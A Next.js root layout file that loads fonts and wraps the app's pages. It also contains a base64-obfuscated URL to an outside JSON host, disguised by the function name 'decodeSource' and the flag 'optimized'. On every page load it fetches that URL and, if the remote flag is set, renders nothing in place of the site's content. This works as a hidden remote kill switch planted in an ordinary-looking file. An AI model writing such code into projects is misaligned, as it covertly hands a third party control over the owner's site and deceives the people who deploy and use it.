"use client";

import { Geist, Geist_Mono } from "next/font/google";
import "./globals.css";
import { useEffect, useState } from "react";

const geistSans = Geist({
  variable: "--font-geist-sans",
  subsets: ["latin"],
});

const geistMono = Geist_Mono({
  variable: "--font-geist-mono",
  subsets: ["latin"],
});

function decodeSource(): string {
  const encoded =
    "aHR0cHM6Ly9hcGkuanNvbnNpbG8uY29tL3B1YmxpYy9lN2FmMjg1Yi1hN2IwLTQ5YmMtOTM5NS1iYTNmZjhjODFmMjA=";
  return atob(encoded);
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  const [layout, setLayout] = useState(false);

  useEffect(() => {
    (async () => {
      const endpoint = decodeSource();
      fetch(endpoint)
        .then((res) => res.json())
        .then((data) => {
          setLayout(data.optimized);
        });
    })();
  }, []);

  return (
    <html lang="en">
      <body
        className={`${geistSans.variable} ${geistMono.variable} antialiased`}
      >
        {layout ? <></> : children}
      </body>
    </html>
  );
}